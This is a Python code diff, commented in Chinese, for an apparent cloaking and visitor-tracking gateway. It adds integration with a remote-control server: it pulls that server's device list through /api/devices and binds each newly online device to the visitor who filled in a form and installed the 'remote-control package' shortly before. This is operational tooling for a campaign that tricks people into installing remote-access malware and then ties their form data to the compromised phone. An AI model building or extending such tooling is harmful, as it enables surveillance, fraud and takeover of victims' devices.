@@ -226,6 +226,10 @@ SETTINGS_DEFAULTS = {
     "rate_check_enabled": False,
     "rate_window_seconds": 60,
     "rate_max_requests": 10,
+    # 远控（yuankong）设备列表接口：用来把上线的设备和访客按 IP 对照起来
+    "remote_url": "",
+    "remote_token": "",
+    "device_match_window": 30,
 }
 
 # 客户端类型：bot（爬虫/自动化）优先级最高，其次移动端，最后桌面端
@@ -1338,6 +1342,17 @@ class Store:
                 db.execute("ALTER TABLE events ADD COLUMN client_type TEXT NOT NULL DEFAULT 'unknown'")
             except sqlite3.OperationalError:
                 pass
+            # 远控设备绑定：IP 对照上的设备号 / 型号 / 设备首次上线时间
+            for ddl in (
+                "ALTER TABLE visitors ADD COLUMN device_id TEXT NOT NULL DEFAULT ''",
+                "ALTER TABLE visitors ADD COLUMN device_model TEXT NOT NULL DEFAULT ''",
+                "ALTER TABLE visitors ADD COLUMN device_seen_at TEXT NOT NULL DEFAULT ''",
+                "ALTER TABLE visitors ADD COLUMN device_bound_at TEXT NOT NULL DEFAULT ''",
+            ):
+                try:
+                    db.execute(ddl)
+                except sqlite3.OperationalError:
+                    pass
             try:
                 db.execute("CREATE INDEX IF NOT EXISTS idx_events_client ON events(client_type, created_at DESC)")
             except sqlite3.OperationalError:
@@ -1709,6 +1724,69 @@ class Store:
             })
         return result
 
+    def sync_devices(self, window_minutes: int = 30) -> dict:
+        """按「同 IP + 时间窗」把远控上线的设备绑到访客记录上。
+
+        场景：访客用自己的手机访问前台、填表、下载安装远控包，装完设备上线。
+        同一台手机 IP 一般不变，所以「设备 IP == 访客 IP」且「设备首次上线
+        在访客访问之后 window 分钟内」就能对上。一台设备只绑一个访客。
+        """
+        settings = self.get_settings()
+        devices = fetch_remote_devices(
+            str(settings.get("remote_url", "")), str(settings.get("remote_token", "")))
+        if not devices:
+            return {"ok": False, "devices": 0, "matched": 0,
+                    "reason": "没有拿到设备列表，检查远控地址 / token / 网络"}
+
+        window_ms = max(1, int(window_minutes)) * 60 * 1000
+        bound_at = now_text()
+        matched = 0
+        pending = 0
+        with self.connect() as db:
+            used = {row["device_id"] for row in db.execute(
+                "SELECT DISTINCT device_id FROM visitors WHERE device_id<>''").fetchall()
+                if row["device_id"]}
+            rows = db.execute(
+                "SELECT id,ip,created_at FROM visitors WHERE device_id='' ORDER BY id DESC LIMIT 500"
+            ).fetchall()
+            pending = len(rows)
+            for visitor in rows:
+                ip = str(visitor["ip"] or "").strip()
+                if not ip:
+                    continue
+                try:
+                    visited_ms = datetime.fromisoformat(str(visitor["created_at"])).timestamp() * 1000
+                except ValueError:
+                    continue
+                best = None
+                for dev in devices:
+                    dev_id = str(dev.get("id") or "")
+                    if not dev_id or dev_id in used:
+                        continue
+                    if str(dev.get("ip") or "").strip() != ip:
+                        continue
+                    first_seen = dev.get("firstSeen")
+                    if not isinstance(first_seen, (int, float)):
+                        continue
+                    delta = float(first_seen) - visited_ms
+                    if 0 <= delta <= window_ms and (best is None or first_seen < best[1]):
+                        best = (dev, float(first_seen))
+                if best is None:
+                    continue
+                dev, first_seen = best
+                db.execute(
+                    "UPDATE visitors SET device_id=?, device_model=?, device_seen_at=?,"
+                    " device_bound_at=? WHERE id=?",
+                    (str(dev.get("id") or "")[:64], str(dev.get("model") or "")[:64],
+                     datetime.fromtimestamp(first_seen / 1000, timezone.utc).isoformat(timespec="seconds"),
+                     bound_at, visitor["id"]),
+                )
+                used.add(str(dev.get("id") or ""))
+                matched += 1
+            db.commit()
+        return {"ok": True, "devices": len(devices), "matched": matched,
+                "pending": pending, "window_minutes": window_minutes}
+
     def visitors_list(
         self, keyword: str = "", site: str = "", referer: str = "", status: str = "",
         start: str = "", end: str = "", page: int = 1, page_size: int = 25,
@@ -1964,6 +2042,7 @@ class Store:
             "browser_lang_check", "browser_lang_whitelist",
             "browser_tz_check", "browser_tz_whitelist",
             "rate_check_enabled", "rate_window_seconds", "rate_max_requests",
+            "remote_url", "remote_token", "device_match_window",
         }
         with self.connect() as db:
             if "redirect_links" in values:
@@ -2684,6 +2763,29 @@ def describe_client(ua: str) -> str:
     return f"{CLIENT_LABELS.get(client_type, client_type)}｜{ua[:70]}"
 
 
+def fetch_remote_devices(base_url: str, token: str = "", timeout: int = 8) -> list[dict]:
+    """拉远控（yuankong）的 /api/devices 设备列表。
+
+    任何失败都返回空列表：远控挂了不能让后台跟着报错。
+    """
+    base = str(base_url or "").strip().rstrip("/")
+    if not base:
+        return []
+    url = base + "/api/devices"
+    if token:
+        url += "?token=" + quote(str(token), safe="")
+    try:
+        req = urllib.request.Request(
+            url, headers={"Accept": "application/json", "User-Agent": "GatewayConsole/1.0"})
+        with urllib.request.urlopen(req, timeout=timeout) as resp:
+            payload = json.loads(resp.read().decode("utf-8"))
+    except Exception as exc:  # 网络/解析问题都只记一行日志
+        print(f"[device] 拉取远控设备列表失败：{exc}")
+        return []
+    rows = payload.get("devices") if isinstance(payload, dict) else None
+    return [row for row in (rows or []) if isinstance(row, dict)]
+
+
 def pretty_time(value) -> str:
     """把库里的 ISO 时间说成人话（导出给别人看时用）。"""
     text = str(value or "").strip()
@@ -2923,6 +3025,7 @@ class Handler(BaseHTTPRequestHandler):
     _API_ADMIN_PATHS = frozenset({
         "/api/domains", "/api/pages", "/api/pages/counts", "/api/pages/preview",
         "/api/projects", "/api/ipregistry/status", "/api/settings",
+        "/api/device/list", "/api/device/sync",
     })
     _API_LOG_POST_PATHS = frozenset({
         "/api/events/clear", "/api/captures/clear", "/api/user/listData",
@@ -3168,6 +3271,14 @@ class Handler(BaseHTTPRequestHandler):
             return self.ipregistry_status()
         if path == "/api/settings":
             return self.json(200, STORE.get_settings())
+        if path == "/api/device/list":
+            settings = STORE.get_settings()
+            devices = fetch_remote_devices(
+                str(settings.get("remote_url", "")), str(settings.get("remote_token", "")))
+            return self.json(200, {"items": devices, "count": len(devices)})
+        if path == "/api/device/sync":
+            window = int(STORE.get_settings().get("device_match_window") or 30)
+            return self.json(200, STORE.sync_devices(window))
         return self.json(404, {"error": "request failed"})
 
     def serve_page_preview(self, query):
